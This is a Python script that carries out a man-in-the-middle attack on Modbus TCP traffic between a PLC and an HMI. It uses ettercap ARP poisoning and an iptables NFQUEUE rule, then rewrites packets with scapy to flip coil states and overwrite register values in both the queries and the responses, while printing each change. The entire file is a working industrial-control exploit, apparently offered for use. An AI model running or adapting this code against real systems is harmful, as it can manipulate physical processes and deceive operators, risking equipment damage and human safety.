from scapy.all import *
from netfilterqueue import NetfilterQueue
import os, nmap
from scapy.contrib import modbus
from random import *
from time import *

plc_ip = '192.168.1.5'
hmi_ip = '192.168.1.99'


def func_start(): 
        print("---------------------------")
        print("-    Modbus TCP - MITM    -")
        print("-   HELP: Ctrl+C to Exit  -")
        print("---------------------------")
        sleep(1)

def get_ip():
        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
        os.system(arp1)
        os.system('pkill -f ettercap')
        sleep(1)

def arp_spoofing():
        
        print("MODBUS SERVER \t\t\t\t CLIENT")
        print("{PLC} <----------------> {HMI} \n\n". format(PLC=plc_ip, HMI=hmi_ip))

        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
        os.system(arp2)
        process = os.popen('pgrep -f ettercap')
        out = process.read()
        process.close()
        print("ettercap is running, PID : {}".format(out))
        print("ARP Poisoning start !!")
        sleep(4)

def process_pkt(packet):
    try:
        z = IP(packet.get_payload())
        func = z.funcCode
        del z[TCP].chksum
        del z[IP].chksum
        del z[IP].len
        del z[TCP].len
        if func == 16:
                c = z[TCP].outputsValue
                z.outputsValue = randrange(10, 200)
                print("Register {add}, change {v1} to {v2}".format(add=z.startAddr, v1=c, v2=z.outputsValue))
        elif func == 5:
                print("# GET Func_Code: 5 ...")
                if z[IP].dst == plc_ip:
                        if z.outputValue == 65280:
                                z.outputValue = 0
                                z.outputAddr = randrange(0, 18)
                                print("Query Coil {} , change 1 to 0".format(z.outputAddr))
                        elif z.outputValue == 0:
                                z.outputValue = 65280
                                z.outputAddr = randrange(0, 18)
                                print("Query Coil {} , change 0 to 1".format(z.outputAddr))
                elif z[IP].dst == hmi_ip:
                        if z.outputValue == 65280:
                                z.outputValue = 0
                                print("Response Coil {} , change 1 to 0".format(z.outputAddr))
                        elif z.outputValue == 0:
                                z.outputValue = 65280
                                print("Response Coil {} , change 0 to 1".format(z.outputAddr))
        elif func == 6: 
                print("# GET Func_Code: 6 ...")
                if z[IP].dst == plc_ip:
                        
                        originValue = z.registerValue
                        z.registerValue = 69
                        # z.registerValue = randrange(0, 9999)
                        print("Query Register {}, change {} to {}". format(z.registerAddr, originValue, z.registerValue))
                elif z[IP].dst == hmi_ip: 
                        
                        originValue = z.registerValue
                        z.registerValue = 69
                        # z.registerValue = randrange(0, 9999)
                        print("Response Register {}, change {} to {}". format(z.registerAddr, originValue, z.registerValue))
        
        packet.set_payload(bytes(z))
        packet.accept()
    except AttributeError:
        packet.accept()

def data_injection():
	QUEUE_NUM = 0
	os.system("iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
	queue = NetfilterQueue()
	try:
    		queue.bind(QUEUE_NUM, process_pkt)
    		queue.run()
	except KeyboardInterrupt:
		os.system("iptables --flush && iptables -t nat -F")
		print("........Exiting......")
		sleep(3)
	finally: 
                queue.unbind()

def change_mac():
        process = os.popen('macchanger -r eth0')
        out1 = process.read()
        process.close()
        print(out1)
        sleep(1)

def main():
        func_start()
        get_ip()
        arp_spoofing()
        data_injection()

main()